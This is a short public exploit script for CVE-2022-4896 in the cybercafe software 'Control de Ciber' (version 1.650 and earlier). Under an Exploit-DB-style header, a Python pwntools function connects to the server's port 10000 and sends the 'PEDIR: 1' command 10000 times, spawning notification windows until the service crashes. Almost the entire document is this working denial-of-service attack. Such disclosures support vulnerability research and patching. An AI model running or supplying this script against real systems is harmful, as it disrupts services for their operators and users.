# Exploit Title: Control de Ciber pedir - Denial of Service (DoS)
# Date: 23/02/2023
# Exploit Authors: sapellaniz
# Vendor Homepage: http://www.cbm.com.ar
# Software Link: http://www.cbm.com.ar/downloads.htm
# Version: <= 1.650
# Tested on: Linux
# CVE: CVE-2022-4896
# Github repo: https://github.com/sapellaniz/CVE-2022-4896


from pwn import *
from time import sleep

SERVER_IP = "192.168.56.101"
SERVER_PORT = 10000

def dos_pedir(ip, port):
    """
    When the server receives the string "PEDIR: <n>" a window spawns notifying
    that product <n> has been ordered from a terminal.
    This function spawn windows on the server until the service collapses.
    """
    s = remote(ip, port)
    for _ in range(10000):
        s.send(f'PEDIR: 1\r\n'.encode())
        sleep(.05)


if __name__ == "__main__":
    dos_pedir(SERVER_IP, SERVER_PORT)
